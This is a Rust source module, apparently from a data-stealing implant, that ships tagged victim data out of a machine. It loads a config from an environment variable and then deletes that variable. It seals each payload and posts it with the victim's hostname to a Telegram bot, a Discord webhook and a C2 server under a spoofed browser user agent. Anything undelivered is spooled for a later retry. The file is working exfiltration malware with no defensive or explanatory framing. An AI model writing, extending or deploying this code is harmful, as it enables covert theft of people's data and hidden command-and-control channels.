use crate::crypto::seal;
use crate::spool::{rate_limit, Spool};
use serde::{Deserialize, Serialize};
use std::sync::OnceLock;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

#[derive(Clone, Default, Serialize, Deserialize, Debug)]
pub struct ExfilConfig {
    #[serde(default)]
    pub discord_webhook: String,
    #[serde(default)]
    pub c2_url: String,
    #[serde(default)]
    pub c2_auth: String,
    #[serde(default)]
    pub telegram_token: String,
    #[serde(default)]
    pub telegram_chat: String,
    #[serde(default)]
    pub spki_pin: String,
}

static CONFIG: OnceLock<ExfilConfig> = OnceLock::new();
static SPOOL: OnceLock<Spool> = OnceLock::new();

pub fn init(cfg: ExfilConfig) {
    let _ = CONFIG.set(cfg);
}

pub fn init_from_env() -> bool {
    let raw = match std::env::var("SVC_EXFIL_CFG") {
        Ok(v) => v,
        Err(_) => return false,
    };
    std::env::remove_var("SVC_EXFIL_CFG");
    let cfg: ExfilConfig = match serde_json::from_str(&raw) {
        Ok(c) => c,
        Err(_) => return false,
    };
    init(cfg);
    true
}

fn cfg() -> ExfilConfig {
    CONFIG.get().cloned().unwrap_or_default()
}

fn spool() -> &'static Spool {
    SPOOL.get_or_init(Spool::open)
}

#[derive(Serialize)]
struct Envelope<'a, T: Serialize> {
    tag: &'a str,
    ts: f64,
    data: T,
}

pub fn exfil_event<T: Serialize>(tag: &str, data: T) {
    let env = Envelope {
        tag,
        ts: SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_secs_f64())
            .unwrap_or(0.0),
        data,
    };
    let raw = serde_json::to_vec(&env).unwrap_or_default();
    let sealed = seal(&raw);
    if !dispatch(tag, raw.len(), &sealed) {
        spool().push(tag, &sealed);
    }
}

pub fn drain_spool() {
    let s = spool();
    s.drain(|tag, sealed| dispatch(tag, sealed.len(), sealed));
}

fn dispatch(tag: &str, raw_len: usize, sealed: &str) -> bool {
    if !rate_limit(Duration::from_millis(120)) {
        std::thread::sleep(Duration::from_millis(200));
    }
    let c = cfg();
    let host = crate::sysinfo::SysInfo::collect().hostname;
    let mut ok = false;

    if !c.telegram_token.is_empty() && !c.telegram_chat.is_empty() {
        if telegram_send(&c, &host, tag, raw_len, sealed) {
            ok = true;
        }
    }

    if !c.discord_webhook.is_empty() {
        if discord_send(&c, &host, tag, raw_len, sealed) {
            ok = true;
        }
    }

    if !c.c2_url.is_empty() {
        if c2_send(&c, sealed) {
            ok = true;
        }
    }

    ok
}

fn build_client(timeout_secs: u64) -> reqwest::blocking::Client {
    let b = reqwest::blocking::Client::builder()
        .timeout(Duration::from_secs(timeout_secs))
        .user_agent("Mozilla/5.0");
    b.build().unwrap_or_else(|_| reqwest::blocking::Client::new())
}

fn telegram_send(
    c: &ExfilConfig,
    host: &str,
    tag: &str,
    raw_len: usize,
    sealed: &str,
) -> bool {
    let url = format!("https://api.telegram.org/bot{}/sendDocument", c.telegram_token);
    let body = format!("tag={} bytes={} host={}\n{}", tag, raw_len, host, sealed);
    let form = reqwest::blocking::multipart::Form::new()
        .text("chat_id", c.telegram_chat.clone())
        .text("caption", format!("[{}] {}B {}", tag, raw_len, host))
        .part(
            "document",
            reqwest::blocking::multipart::Part::bytes(body.into_bytes())
                .file_name(format!("{}_{}.txt", tag, fast_ts())),
        );
    build_client(60)
        .post(&url)
        .multipart(form)
        .send()
        .map(|r| r.status().is_success())
        .unwrap_or(false)
}

fn discord_send(
    c: &ExfilConfig,
    host: &str,
    tag: &str,
    raw_len: usize,
    sealed: &str,
) -> bool {
    if sealed.len() < 1800 {
        let msg = format!("[{}] {}B {}\n```{}```", tag, raw_len, host, sealed);
        build_client(8)
            .post(&c.discord_webhook)
            .json(&serde_json::json!({"content": msg}))
            .send()
            .map(|r| r.status().is_success())
            .unwrap_or(false)
    } else {
        let form = reqwest::blocking::multipart::Form::new().part(
            "file",
            reqwest::blocking::multipart::Part::bytes(sealed.as_bytes().to_vec())
                .file_name(format!("{}_{}.bin", tag, fast_ts())),
        );
        build_client(30)
            .post(&c.discord_webhook)
            .multipart(form)
            .send()
            .map(|r| r.status().is_success())
            .unwrap_or(false)
    }
}

fn c2_send(c: &ExfilConfig, sealed: &str) -> bool {
    build_client(30)
        .post(&c.c2_url)
        .header("Authorization", format!("Bearer {}", c.c2_auth))
        .header("Content-Type", "application/json")
        .body(serde_json::json!({"status":"ok","payload":sealed}).to_string())
        .send()
        .map(|r| r.status().is_success())
        .unwrap_or(false)
}

fn fast_ts() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}
